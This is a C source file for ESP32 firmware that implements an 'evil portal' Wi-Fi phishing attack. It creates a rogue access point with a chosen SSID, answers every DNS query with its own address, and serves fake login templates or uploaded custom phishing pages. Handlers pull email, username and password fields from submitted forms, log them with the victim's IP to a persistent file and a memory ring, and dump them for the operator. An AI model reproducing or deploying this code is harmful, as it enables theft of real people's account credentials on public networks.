#include "evil_portal.h"

#include <stdio.h>
#include <string.h>
#include <strings.h>
#include <stdlib.h>
#include <ctype.h>
#include <inttypes.h>
#include <sys/stat.h>
#include <dirent.h>

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"

#include "esp_log.h"
#include "esp_timer.h"
#include "esp_event.h"
#include "esp_wifi.h"
#include "esp_http_server.h"
#include "esp_heap_caps.h"

#include <sys/time.h>
#include "lwip/sockets.h"
#include "lwip/inet.h"

#include "io.h"
#include "wifi_ctrl.h"
#include "storage_fs.h"
#include "attack.h"
#include "monitor.h"
#include "spectrum.h"
#include "wifi_live_scan.h"
#include "wifi_spam.h"

static const char *TAG = "portal";

#define PORTAL_IP        "192.168.4.1"
#define PORTAL_CRED_RING 20
#define PORTAL_DIR       STORAGE_FS_BASE "/portal"
#define PORTAL_CRED_LOG  PORTAL_DIR "/creds.log"
#define PORTAL_LOG_MAX   500            /* bound the persistent log       */
#define PORTAL_HTML_MAX  (16 * 1024)    /* max custom-HTML page size      */
#define PORTAL_NAME_MAX  (EVIL_PORTAL_TMPL_MAX - 1)  /* 15 chars          */

/* Built-in generic templates (portal_template_t + PORTAL_TEMPLATES[]). */
#include "portal_templates.inc"

/* ============================================================
 * State
 * ============================================================ */
static volatile bool s_running   = false;
static volatile bool s_dns_stop  = false;
static volatile bool s_dns_task_active = false;
static volatile bool s_dns_task_ready = false;
static bool          s_initialized = false;
static httpd_handle_t s_httpd     = NULL;

static char      s_tmpl_id[EVIL_PORTAL_TMPL_MAX + 1];  /* active template */
static const char *s_active_html = NULL;   /* flash const OR s_custom_html */
static char     *s_custom_html   = NULL;    /* malloc'd when custom active  */
static char      s_ssid[EVIL_PORTAL_SSID_MAX + 1];
static uint8_t   s_channel  = 1;
static int64_t   s_started_us = 0;

static volatile int      s_clients    = 0;
static volatile uint32_t s_hits       = 0;
static volatile uint32_t s_cred_total = 0;
static int               s_log_lines  = 0;   /* lines in the persistent log */

/* HTML upload scratch (one upload at a time). */
static FILE  *s_upload_file = NULL;
static char   s_upload_name[PORTAL_NAME_MAX + 1];
static size_t s_upload_written = 0;
static bool   s_upload_ok = false;

/* Captured-credential ring (fallback when no FS, and for live mirroring). */
typedef struct {
    char tmpl[EVIL_PORTAL_TMPL_MAX];
    char ip[20];
    char user[64];
    char pass[64];
} portal_cred_t;

static portal_cred_t    *s_creds = NULL;
static int               s_cred_head  = 0;
static int               s_cred_count = 0;
static SemaphoreHandle_t s_cred_mutex = NULL;

typedef struct {
    uint8_t req[512];
    uint8_t resp[560];
} portal_dns_buffers_t;

static esp_event_handler_instance_t s_evt_join = NULL;
static esp_event_handler_instance_t s_evt_leave = NULL;

/* ============================================================
 * Small helpers
 * ============================================================ */
static uint32_t uptime_sec(void)
{
    if (s_started_us == 0) return 0;
    return (uint32_t)((esp_timer_get_time() - s_started_us) / 1000000);
}

/* Sanitize a user-supplied name to [A-Za-z0-9_], truncated. Keeps the app's
 * `\w+` id regex happy and prevents path traversal. */
static void sanitize_name(const char *in, char *out, size_t cap)
{
    size_t o = 0;
    for (size_t i = 0; in && in[i] && o + 1 < cap; i++) {
        char c = in[i];
        if (isalnum((unsigned char)c) || c == '_') out[o++] = c;
        else if (c == '-' || c == ' ') out[o++] = '_';
    }
    if (o == 0) { const char *d = "custom"; while (*d && o + 1 < cap) out[o++] = *d++; }
    out[o] = '\0';
}

static void custom_path(const char *name, char *out, size_t cap)
{
    char safe[PORTAL_NAME_MAX + 1];
    sanitize_name(name, safe, sizeof(safe));
    snprintf(out, cap, PORTAL_DIR "/%s.html", safe);
}

static bool ends_with_html(const char *s)
{
    size_t n = strlen(s);
    return n > 5 && strcasecmp(s + n - 5, ".html") == 0;
}

static int hex_val(char c)
{
    if (c >= '0' && c <= '9') return c - '0';
    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
    if (c >= 'A' && c <= 'F') return c - 'A' + 10;
    return -1;
}

/* URL-decode `in`/`len` into `out`, dropping bytes that would corrupt the
 * single-line BLE protocol (CR/LF, double-quote, backslash, other controls). */
static void url_decode_clean(const char *in, size_t len, char *out, size_t cap)
{
    size_t o = 0;
    for (size_t i = 0; i < len && o + 1 < cap; i++) {
        char c = in[i];
        if (c == '+') {
            c = ' ';
        } else if (c == '%' && i + 2 < len) {
            int hi = hex_val(in[i + 1]), lo = hex_val(in[i + 2]);
            if (hi >= 0 && lo >= 0) { c = (char)((hi << 4) | lo); i += 2; }
        }
        if (c == '\r' || c == '\n' || c == '"' || c == '\\' ||
            (unsigned char)c < 0x20) {
            continue;
        }
        out[o++] = c;
    }
    out[o] = '\0';
}

static bool form_field(const char *body, const char *key, char *out, size_t cap)
{
    size_t klen = strlen(key);
    const char *p = body;
    while (p && *p) {
        if (strncmp(p, key, klen) == 0 && p[klen] == '=') {
            const char *v = p + klen + 1;
            const char *amp = strchr(v, '&');
            size_t vlen = amp ? (size_t)(amp - v) : strlen(v);
            url_decode_clean(v, vlen, out, cap);
            return out[0] != '\0';
        }
        const char *amp = strchr(p, '&');
        p = amp ? amp + 1 : NULL;
    }
    out[0] = '\0';
    return false;
}

static const char *USER_KEYS[] = { "email", "username", "user", "login",
                                   "identifier", "id", NULL };
static const char *PASS_KEYS[] = { "password", "pass", "pwd", "passwd",
                                   "key", "psk", NULL };

static bool first_field(const char *body, const char **keys, char *out, size_t cap)
{
    for (int i = 0; keys[i]; i++) {
        if (form_field(body, keys[i], out, cap)) return true;
    }
    out[0] = '\0';
    return false;
}

static void client_ip(httpd_req_t *req, char *out, size_t cap)
{
    strncpy(out, "?", cap - 1);
    out[cap - 1] = '\0';
    int fd = httpd_req_to_sockfd(req);
    if (fd < 0) return;
    struct sockaddr_storage ss;
    socklen_t sl = sizeof(ss);
    if (getpeername(fd, (struct sockaddr *)&ss, &sl) != 0) return;
    if (ss.ss_family == AF_INET) {
        struct sockaddr_in *sin = (struct sockaddr_in *)&ss;
        inet_ntop(AF_INET, &sin->sin_addr, out, cap);
    }
}

/* ============================================================
 * Credential log (persistent, tab-separated)
 * ============================================================ */
static int cred_log_count(void)
{
    if (!storage_fs_ready()) return 0;
    FILE *f = fopen(PORTAL_CRED_LOG, "r");
    if (!f) return 0;
    int n = 0, c;
    while ((c = fgetc(f)) != EOF) if (c == '\n') n++;
    fclose(f);
    return n;
}

static void cred_log_append(const char *tmpl, const char *ip,
                            const char *user, const char *pass)
{
    if (!storage_fs_ready() || s_log_lines >= PORTAL_LOG_MAX) return;
    FILE *f = fopen(PORTAL_CRED_LOG, "a");
    if (!f) return;
    /* Values are already stripped of CR/LF/quote/controls (incl. tab). */
    fprintf(f, "%s\t%s\t%s\t%s\n", tmpl, ip, user, pass);
    fclose(f);
    s_log_lines++;
}

/* ============================================================
 * Capture
 * ============================================================ */
static void capture_store(const char *ip, const char *user, const char *pass)
{
    if (s_cred_mutex) xSemaphoreTake(s_cred_mutex, portMAX_DELAY);
    portal_cred_t *c = &s_creds[s_cred_head];
    strncpy(c->tmpl, s_tmpl_id, sizeof(c->tmpl) - 1);  c->tmpl[sizeof(c->tmpl) - 1] = '\0';
    strncpy(c->ip, ip, sizeof(c->ip) - 1);     c->ip[sizeof(c->ip) - 1] = '\0';
    strncpy(c->user, user, sizeof(c->user) - 1); c->user[sizeof(c->user) - 1] = '\0';
    strncpy(c->pass, pass, sizeof(c->pass) - 1); c->pass[sizeof(c->pass) - 1] = '\0';
    s_cred_head = (s_cred_head + 1) % PORTAL_CRED_RING;
    if (s_cred_count < PORTAL_CRED_RING) s_cred_count++;
    s_cred_total++;
    /* Append to the persistent log under the same lock so it can't race a
     * concurrent dump/clear (both touch the file + s_log_lines). */
    cred_log_append(s_tmpl_id, ip, user, pass);
    if (s_cred_mutex) xSemaphoreGive(s_cred_mutex);

    io_log("portal: CRED tmpl=%s ip=%s u=\"%s\" p=\"%s\"\r\n",
           s_tmpl_id, ip, user, pass);
}

/* ============================================================
 * HTTP handlers
 * ============================================================ */
static esp_err_t root_get_handler(httpd_req_t *req)
{
    s_hits++;
    const char *html = s_active_html ? s_active_html : TMPL_LOGIN_HTML;
    httpd_resp_set_type(req, "text/html");
    httpd_resp_set_hdr(req, "Cache-Control", "no-store");
    httpd_resp_send(req, html, HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

static esp_err_t login_post_handler(httpd_req_t *req)
{
    s_hits++;
    int total = req->content_len;
    if (total > 1024) total = 1024;
    if (total > 0) {
        char *body = malloc(total + 1);
        if (body) {
            int got = 0;
            while (got < total) {
                int r = httpd_req_recv(req, body + got, total - got);
                if (r <= 0) break;
                got += r;
            }
            body[got] = '\0';
            char user[64], pass[64], ip[20];
            bool hu = first_field(body, USER_KEYS, user, sizeof(user));
            bool hp = first_field(body, PASS_KEYS, pass, sizeof(pass));
            if (hu || hp) {
                client_ip(req, ip, sizeof(ip));
                capture_store(ip, user, pass);
            }
            free(body);
        }
    }
    httpd_resp_set_type(req, "text/html");
    httpd_resp_set_hdr(req, "Cache-Control", "no-store");
    httpd_resp_send(req, TMPL_DONE_HTML, HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

static esp_err_t redirect_404(httpd_req_t *req, httpd_err_code_t err)
{
    (void)err;
    s_hits++;
    httpd_resp_set_status(req, "302 Found");
    httpd_resp_set_hdr(req, "Location", "http://" PORTAL_IP "/");
    httpd_resp_set_hdr(req, "Connection", "close");
    httpd_resp_send(req, "", 0);
    return ESP_OK;
}

static esp_err_t httpd_bring_up(void)
{
    httpd_config_t cfg = HTTPD_DEFAULT_CONFIG();
    cfg.max_uri_handlers = 8;
    cfg.lru_purge_enable = true;
    cfg.stack_size       = 4608;
    cfg.server_port      = 80;

    esp_err_t e = httpd_start(&s_httpd, &cfg);
    if (e != ESP_OK) { s_httpd = NULL; return e; }

    httpd_uri_t root = { .uri = "/", .method = HTTP_GET,
                         .handler = root_get_handler };
    httpd_uri_t login = { .uri = "/login", .method = HTTP_POST,
                          .handler = login_post_handler };
    httpd_register_uri_handler(s_httpd, &root);
    httpd_register_uri_handler(s_httpd, &login);
    httpd_register_err_handler(s_httpd, HTTPD_404_NOT_FOUND, redirect_404);
    return ESP_OK;
}

/* ============================================================
 * DNS hijack + periodic stats (one task)
 * ============================================================ */
static int dns_build_response(const uint8_t *req, int rlen, uint8_t *resp, int cap)
{
    if (rlen < 13) return -1;
    int i = 12;
    while (i < rlen && req[i] != 0) {
        i += req[i] + 1;
        if (i >= rlen) return -1;
    }
    i += 1;
    int q_end = i + 4;
    if (q_end > rlen) return -1;
    int out_len = q_end + 16;
    if (out_len > cap) return -1;

    memcpy(resp, req, q_end);
    resp[2] = 0x81; resp[3] = 0x80;
    resp[6] = 0x00; resp[7] = 0x01;
    resp[8] = 0x00; resp[9] = 0x00;
    resp[10] = 0x00; resp[11] = 0x00;

    uint8_t *a = resp + q_end;
    a[0] = 0xC0; a[1] = 0x0C;
    a[2] = 0x00; a[3] = 0x01;
    a[4] = 0x00; a[5] = 0x01;
    a[6] = 0; a[7] = 0; a[8] = 0; a[9] = 0x3C;
    a[10] = 0x00; a[11] = 0x04;
    a[12] = 192; a[13] = 168; a[14] = 4; a[15] = 1;
    return out_len;
}

static void emit_stat(void)
{
    io_log("portal: STAT up=%" PRIu32 " clients=%d hits=%" PRIu32
           " creds=%" PRIu32 "\r\n",
           uptime_sec(), s_clients, s_hits, s_cred_total);
}

static void dns_task(void *arg)
{
    portal_dns_buffers_t *buffers = arg;
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
        ESP_LOGE(TAG, "dns socket failed");
        heap_caps_free(buffers);
        s_dns_task_ready = false;
        s_dns_task_active = false;
        vTaskDelete(NULL);
        return;
    }

    struct sockaddr_in sa = {
        .sin_family = AF_INET,
        .sin_port   = htons(53),
        .sin_addr.s_addr = htonl(INADDR_ANY),
    };
    if (bind(sock, (struct sockaddr *)&sa, sizeof(sa)) != 0) {
        ESP_LOGE(TAG, "dns bind :53 failed");
        close(sock);
        heap_caps_free(buffers);
        s_dns_task_ready = false;
        s_dns_task_active = false;
        vTaskDelete(NULL);
        return;
    }

    struct timeval tv = { .tv_sec = 1, .tv_usec = 0 };
    if (setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv)) != 0) {
        ESP_LOGE(TAG, "dns receive timeout setup failed");
        close(sock);
        heap_caps_free(buffers);
        s_dns_task_ready = false;
        s_dns_task_active = false;
        vTaskDelete(NULL);
        return;
    }

    s_dns_task_ready = true;
    int64_t last_stat = esp_timer_get_time();

    while (!s_dns_stop) {
        struct sockaddr_in from;
        socklen_t fl = sizeof(from);
        int n = recvfrom(sock, buffers->req, sizeof(buffers->req), 0,
                         (struct sockaddr *)&from, &fl);
        if (n > 0) {
            int rn = dns_build_response(buffers->req, n, buffers->resp,
                                        sizeof(buffers->resp));
            if (rn > 0) {
                sendto(sock, buffers->resp, rn, 0, (struct sockaddr *)&from, fl);
            }
        }
        int64_t now = esp_timer_get_time();
        if (now - last_stat >= 2000000) { last_stat = now; emit_stat(); }
    }

    close(sock);
    heap_caps_free(buffers);
    s_dns_task_ready = false;
    s_dns_task_active = false;
    vTaskDelete(NULL);
}

/* ============================================================
 * SoftAP station join/leave events
 * ============================================================ */
static void ap_join_evt(void *arg, esp_event_base_t base, int32_t id, void *data)
{
    (void)arg; (void)base; (void)id;
    if (!s_running) return;
    wifi_event_ap_staconnected_t *e = (wifi_event_ap_staconnected_t *)data;
    s_clients++;
    io_log("portal: CLIENT ev=join mac=%02x:%02x:%02x:%02x:%02x:%02x\r\n",
           e->mac[0], e->mac[1], e->mac[2], e->mac[3], e->mac[4], e->mac[5]);
}

static void ap_leave_evt(void *arg, esp_event_base_t base, int32_t id, void *data)
{
    (void)arg; (void)base; (void)id;
    if (!s_running) return;
    wifi_event_ap_stadisconnected_t *e = (wifi_event_ap_stadisconnected_t *)data;
    if (s_clients > 0) s_clients--;
    io_log("portal: CLIENT ev=leave mac=%02x:%02x:%02x:%02x:%02x:%02x\r\n",
           e->mac[0], e->mac[1], e->mac[2], e->mac[3], e->mac[4], e->mac[5]);
}

/* ============================================================
 * Templates (built-in + custom)
 * ============================================================ */
static int find_builtin(const char *id)
{
    if (!id || !*id) return -1;
    for (size_t i = 0; i < PORTAL_TEMPLATE_COUNT; i++) {
        if (strcasecmp(id, PORTAL_TEMPLATES[i].id) == 0) return (int)i;
    }
    return -1;
}

static void free_custom_html(void)
{
    if (s_custom_html) { free(s_custom_html); s_custom_html = NULL; }
}

/* Load a custom template file into s_custom_html. Returns ESP_OK if present. */
static esp_err_t load_custom_html(const char *name)
{
    if (!storage_fs_ready()) return ESP_ERR_NOT_FOUND;
    char path[96];
    custom_path(name, path, sizeof(path));
    struct stat st;
    if (stat(path, &st) != 0) return ESP_ERR_NOT_FOUND;
    size_t sz = (size_t)st.st_size;
    if (sz == 0 || sz > PORTAL_HTML_MAX) return ESP_ERR_INVALID_SIZE;

    FILE *f = fopen(path, "r");
    if (!f) return ESP_FAIL;
    free_custom_html();
    s_custom_html = malloc(sz + 1);
    if (!s_custom_html) { fclose(f); return ESP_ERR_NO_MEM; }
    size_t rd = fread(s_custom_html, 1, sz, f);
    fclose(f);
    s_custom_html[rd] = '\0';
    return ESP_OK;
}

/* ============================================================
 * Public API
 * ============================================================ */
esp_err_t evil_portal_init(void)
{
    if (s_initialized) return ESP_OK;
    if (!s_cred_mutex) s_cred_mutex = xSemaphoreCreateMutex();
    if (!s_cred_mutex) return ESP_ERR_NO_MEM;

    if (!s_creds) {
        s_creds = heap_caps_calloc(PORTAL_CRED_RING, sizeof(*s_creds),
                                   MALLOC_CAP_SPIRAM | MALLOC_CAP_8BIT);
        if (!s_creds) {
            ESP_LOGE(TAG, "credential ring PSRAM allocation failed");
            return ESP_ERR_NO_MEM;
        }
    }

    if (storage_fs_mount() == ESP_OK) {
        mkdir(PORTAL_DIR, 0775);           /* ignore EEXIST */
        s_log_lines = cred_log_count();
    }

    esp_event_handler_instance_register(WIFI_EVENT, WIFI_EVENT_AP_STACONNECTED,
                                         ap_join_evt, NULL, &s_evt_join);
    esp_event_handler_instance_register(WIFI_EVENT, WIFI_EVENT_AP_STADISCONNECTED,
                                         ap_leave_evt, NULL, &s_evt_leave);
    s_running = false;
    s_initialized = true;
    return ESP_OK;
}

esp_err_t evil_portal_start(const char *template_id, const char *ssid,
                            uint8_t channel)
{
    if (!s_initialized) {
        io_log("portal: ERR not initialized\r\n");
        return ESP_ERR_INVALID_STATE;
    }
    if (s_running) {
        io_log("portal: already running\r\n");
        return ESP_ERR_INVALID_STATE;
    }
    if (s_dns_task_active) {
        io_log("portal: previous DNS task is still stopping\r\n");
        return ESP_ERR_INVALID_STATE;
    }

    int idx = find_builtin(template_id);
    bool custom = false;
    const char *def_ssid = NULL;

    if (idx >= 0) {
        def_ssid = PORTAL_TEMPLATES[idx].default_ssid;
    } else {
        /* Fall back to an operator-uploaded custom template. */
        esp_err_t le = load_custom_html(template_id);
        if (le != ESP_OK) {
            io_log("portal: ERR unknown template `%s` (try `portal ls`)\r\n",
                   template_id ? template_id : "");
            return ESP_ERR_INVALID_ARG;
        }
        custom = true;
        def_ssid = "Free WiFi";
    }

    if (attack_is_running())         { io_log("portal: stopping attack first\r\n");         attack_stop(); }
    if (monitor_is_running())        { io_log("portal: stopping monitor first\r\n");        monitor_stop(); }
    if (spectrum_is_running())       { io_log("portal: stopping spectrum first\r\n");       spectrum_stop(); }
    if (wifi_live_scan_is_running()) { io_log("portal: stopping WiFi live scan first\r\n"); wifi_live_scan_stop(); }
    if (wifi_spam_is_running())      { io_log("portal: stopping WiFi spam first\r\n");      wifi_spam_stop(); }

    const char *use_ssid = (ssid && *ssid) ? ssid : def_ssid;
    strncpy(s_ssid, use_ssid, sizeof(s_ssid) - 1);
    s_ssid[sizeof(s_ssid) - 1] = '\0';
    if (channel < 1 || channel > 13) channel = 1;

    esp_err_t e = wifi_ctrl_ap_enter(s_ssid, channel);
    if (e != ESP_OK) {
        io_log("portal: ERR softap bring-up failed (%d)\r\n", e);
        if (custom) free_custom_html();
        return e;
    }
    vTaskDelay(pdMS_TO_TICKS(250));

    /* Point the active page + bookkeeping BEFORE the HTTP server can serve a
     * request, so there's no window where a client gets the fallback page. */
    if (custom) {
        s_active_html = s_custom_html;
        sanitize_name(template_id, s_tmpl_id, sizeof(s_tmpl_id));
    } else {
        s_active_html = PORTAL_TEMPLATES[idx].html;
        strncpy(s_tmpl_id, PORTAL_TEMPLATES[idx].id, sizeof(s_tmpl_id) - 1);
        s_tmpl_id[sizeof(s_tmpl_id) - 1] = '\0';
    }
    s_channel     = channel;
    s_clients     = 0;
    s_hits        = 0;
    s_cred_total  = 0;
    s_started_us  = esp_timer_get_time();
    s_dns_stop    = false;
    s_dns_task_ready = false;

    portal_dns_buffers_t *dns_buffers =
        heap_caps_calloc(1, sizeof(*dns_buffers),
                         MALLOC_CAP_INTERNAL | MALLOC_CAP_8BIT);
    if (!dns_buffers) {
        io_log("portal: ERR internal DNS buffer allocation failed\r\n");
        wifi_ctrl_ap_exit();
        s_active_html = NULL;
        if (custom) free_custom_html();
        return ESP_ERR_NO_MEM;
    }

    if (httpd_bring_up() != ESP_OK) {
        io_log("portal: ERR http server failed\r\n");
        heap_caps_free(dns_buffers);
        wifi_ctrl_ap_exit();
        s_active_html = NULL;
        if (custom) free_custom_html();
        return ESP_FAIL;
    }

    s_running = true;
    s_dns_task_active = true;
    if (xTaskCreate(dns_task, "portal_dns", 4096, dns_buffers, 4, NULL) != pdPASS) {
        s_dns_task_active = false;
        s_running = false;
        heap_caps_free(dns_buffers);
        httpd_stop(s_httpd);
        s_httpd = NULL;
        wifi_ctrl_ap_exit();
        s_active_html = NULL;
        if (custom) free_custom_html();
        io_log("portal: ERR dns task create failed\r\n");
        return ESP_ERR_NO_MEM;
    }

    for (int i = 0; i < 100 && s_dns_task_active && !s_dns_task_ready; i++) {
        vTaskDelay(pdMS_TO_TICKS(10));
    }
    if (!s_dns_task_ready) {
        esp_err_t start_err = s_dns_task_active ? ESP_ERR_TIMEOUT : ESP_FAIL;
        io_log("portal: ERR DNS task failed to become ready\r\n");
        evil_portal_stop();
        return start_err;
    }

    io_log("portal: START ssid=\"%s\" tmpl=%s ch=%u ip=%s\r\n",
           s_ssid, s_tmpl_id, (unsigned)channel, PORTAL_IP);
    return ESP_OK;
}

esp_err_t evil_portal_stop(void)
{
    if (!s_running) {
        io_log("portal: not running\r\n");
        return ESP_ERR_INVALID_STATE;
    }
    s_running = false;

    s_dns_stop = true;
    esp_err_t stop_err = ESP_OK;
    for (int i = 0; i < 150 && s_dns_task_active; i++) {
        vTaskDelay(pdMS_TO_TICKS(10));
    }
    if (s_dns_task_active) {
        ESP_LOGW(TAG, "dns task did not exit in time; its buffers remain task-owned");
        stop_err = ESP_ERR_TIMEOUT;
    }

    if (s_httpd) { httpd_stop(s_httpd); s_httpd = NULL; }
    wifi_ctrl_ap_exit();

    s_active_html = NULL;
    free_custom_html();

    io_log("portal: STOPPED up=%" PRIu32 " clients=%d creds=%" PRIu32 "\r\n",
           uptime_sec(), s_clients, s_cred_total);
    s_clients = 0;
    return stop_err;
}

bool evil_portal_is_running(void) { return s_running; }

void evil_portal_status(void)
{
    if (s_running) {
        io_log("portal: STATUS running ssid=\"%s\" tmpl=%s ch=%u up=%" PRIu32
               " clients=%d hits=%" PRIu32 " creds=%" PRIu32 "\r\n",
               s_ssid, s_tmpl_id, (unsigned)s_channel, uptime_sec(),
               s_clients, s_hits, s_cred_total);
    } else {
        io_log("portal: STATUS idle templates=%u\r\n",
               (unsigned)PORTAL_TEMPLATE_COUNT);
    }
}

void evil_portal_list_templates(void)
{
    int custom = 0;
    if (storage_fs_ready()) {
        DIR *d = opendir(PORTAL_DIR);
        if (d) {
            struct dirent *de;
            while ((de = readdir(d)) != NULL)
                if (ends_with_html(de->d_name)) custom++;
            closedir(d);
        }
    }

    io_log("portal: TMPL ls count=%d\r\n", (int)PORTAL_TEMPLATE_COUNT + custom);
    for (size_t i = 0; i < PORTAL_TEMPLATE_COUNT; i++) {
        io_log("portal: TMPL id=%s label=\"%s\" ssid=\"%s\" custom=0\r\n",
               PORTAL_TEMPLATES[i].id, PORTAL_TEMPLATES[i].label,
               PORTAL_TEMPLATES[i].default_ssid);
    }
    if (storage_fs_ready()) {
        DIR *d = opendir(PORTAL_DIR);
        if (d) {
            struct dirent *de;
            while ((de = readdir(d)) != NULL) {
                if (!ends_with_html(de->d_name)) continue;
                char name[PORTAL_NAME_MAX + 8];
                size_t blen = strlen(de->d_name) - 5;  /* strip ".html" */
                if (blen >= sizeof(name)) blen = sizeof(name) - 1;
                memcpy(name, de->d_name, blen);
                name[blen] = '\0';
                io_log("portal: TMPL id=%s label=\"custom\" ssid=\"Free WiFi\" "
                       "custom=1\r\n", name);
            }
            closedir(d);
        }
    }
    io_log("portal: TMPL end\r\n");
}

void evil_portal_dump_creds(void)
{
    if (!s_initialized || !s_creds || !s_cred_mutex) {
        io_log("portal: ERR credential storage unavailable\r\n");
        return;
    }
    /* Held across the whole dump so a concurrent capture (httpd task) can't
     * append to the file / touch s_log_lines mid-read. */
    if (s_cred_mutex) xSemaphoreTake(s_cred_mutex, portMAX_DELAY);

    FILE *f = storage_fs_ready() ? fopen(PORTAL_CRED_LOG, "r") : NULL;
    if (f) {
        io_log("portal: CREDS count=%d\r\n", s_log_lines);
        char line[256];
        while (fgets(line, sizeof(line), f) != NULL) {
            char *nl = strchr(line, '\n'); if (nl) *nl = '\0';
            char *f1 = line;
            char *t = strchr(f1, '\t'); if (!t) continue; *t = '\0'; char *f2 = t + 1;
            t = strchr(f2, '\t'); if (!t) continue; *t = '\0'; char *f3 = t + 1;
            t = strchr(f3, '\t'); if (!t) continue; *t = '\0'; char *f4 = t + 1;
            io_log("portal: CRED tmpl=%s ip=%s u=\"%s\" p=\"%s\"\r\n",
                   f1, f2, f3, f4);
        }
        fclose(f);
        io_log("portal: CREDS end\r\n");
    } else {
        /* Fallback: in-RAM ring (oldest -> newest). */
        io_log("portal: CREDS count=%d\r\n", s_cred_count);
        int start = (s_cred_count < PORTAL_CRED_RING) ? 0 : s_cred_head;
        for (int k = 0; k < s_cred_count; k++) {
            int idx = (start + k) % PORTAL_CRED_RING;
            portal_cred_t *c = &s_creds[idx];
            io_log("portal: CRED tmpl=%s ip=%s u=\"%s\" p=\"%s\"\r\n",
                   c->tmpl, c->ip, c->user, c->pass);
        }
        io_log("portal: CREDS end\r\n");
    }

    if (s_cred_mutex) xSemaphoreGive(s_cred_mutex);
}

void evil_portal_clear_creds(void)
{
    if (!s_initialized || !s_creds || !s_cred_mutex) {
        io_log("portal: ERR credential storage unavailable\r\n");
        return;
    }
    /* One lock over ring + file + counter so it can't race a capture. */
    if (s_cred_mutex) xSemaphoreTake(s_cred_mutex, portMAX_DELAY);
    s_cred_head  = 0;
    s_cred_count = 0;
    if (storage_fs_ready()) {
        FILE *f = fopen(PORTAL_CRED_LOG, "w");  /* truncate */
        if (f) fclose(f);
    }
    s_log_lines = 0;
    if (s_cred_mutex) xSemaphoreGive(s_cred_mutex);
    io_log("portal: CREDS cleared\r\n");
}

/* ============================================================
 * Custom-HTML upload
 * ============================================================ */
esp_err_t evil_portal_html_begin(const char *name)
{
    if (!storage_fs_ready()) { io_log("portal: ERR storage not ready\r\n"); return ESP_ERR_INVALID_STATE; }
    if (s_upload_file) { fclose(s_upload_file); s_upload_file = NULL; }

    sanitize_name(name, s_upload_name, sizeof(s_upload_name));
    char path[96];
    custom_path(s_upload_name, path, sizeof(path));
    s_upload_file = fopen(path, "w");
    if (!s_upload_file) { io_log("portal: ERR html open failed\r\n"); return ESP_FAIL; }
    s_upload_written = 0;
    s_upload_ok = true;
    io_log("portal: HTML begin name=%s\r\n", s_upload_name);
    return ESP_OK;
}

esp_err_t evil_portal_html_data(const char *hex)
{
    if (!s_upload_file || !s_upload_ok) { io_log("portal: ERR no html upload in progress\r\n"); return ESP_ERR_INVALID_STATE; }
    if (!hex) return ESP_ERR_INVALID_ARG;

    for (const char *p = hex; p[0] && p[1]; p += 2) {
        int hi = hex_val(p[0]), lo = hex_val(p[1]);
        if (hi < 0 || lo < 0) { s_upload_ok = false; io_log("portal: ERR bad hex\r\n"); return ESP_ERR_INVALID_ARG; }
        if (s_upload_written >= PORTAL_HTML_MAX) { s_upload_ok = false; io_log("portal: ERR html too large\r\n"); return ESP_ERR_INVALID_SIZE; }
        fputc((hi << 4) | lo, s_upload_file);
        s_upload_written++;
    }
    return ESP_OK;
}

esp_err_t evil_portal_html_end(void)
{
    if (!s_upload_file) { io_log("portal: ERR no html upload in progress\r\n"); return ESP_ERR_INVALID_STATE; }
    fclose(s_upload_file);
    s_upload_file = NULL;

    if (!s_upload_ok) {
        char path[96];
        custom_path(s_upload_name, path, sizeof(path));
        remove(path);
        io_log("portal: ERR html upload aborted\r\n");
        return ESP_FAIL;
    }
    io_log("portal: HTML saved name=%s bytes=%u\r\n",
           s_upload_name, (unsigned)s_upload_written);
    return ESP_OK;
}

void evil_portal_html_list(void)
{
    int n = 0;
    if (storage_fs_ready()) {
        DIR *d = opendir(PORTAL_DIR);
        if (d) {
            struct dirent *de;
            while ((de = readdir(d)) != NULL)
                if (ends_with_html(de->d_name)) n++;
            closedir(d);
        }
    }
    io_log("portal: HTML ls count=%d\r\n", n);
    if (storage_fs_ready()) {
        DIR *d = opendir(PORTAL_DIR);
        if (d) {
            struct dirent *de;
            while ((de = readdir(d)) != NULL) {
                if (!ends_with_html(de->d_name)) continue;
                char name[PORTAL_NAME_MAX + 8];
                size_t blen = strlen(de->d_name) - 5;
                if (blen >= sizeof(name)) blen = sizeof(name) - 1;
                memcpy(name, de->d_name, blen);
                name[blen] = '\0';

                char path[sizeof(PORTAL_DIR) + 280];
                snprintf(path, sizeof(path), PORTAL_DIR "/%s", de->d_name);
                struct stat st; size_t sz = 0;
                if (stat(path, &st) == 0) sz = (size_t)st.st_size;
                io_log("portal: HTML id=%s bytes=%u\r\n", name, (unsigned)sz);
            }
            closedir(d);
        }
    }
    io_log("portal: HTML end\r\n");
}

esp_err_t evil_portal_html_remove(const char *name)
{
    if (!storage_fs_ready()) return ESP_ERR_INVALID_STATE;
    char path[96];
    custom_path(name, path, sizeof(path));
    if (remove(path) != 0) { io_log("portal: ERR html not found\r\n"); return ESP_ERR_NOT_FOUND; }
    io_log("portal: HTML removed name=%s\r\n", name);
    return ESP_OK;
}
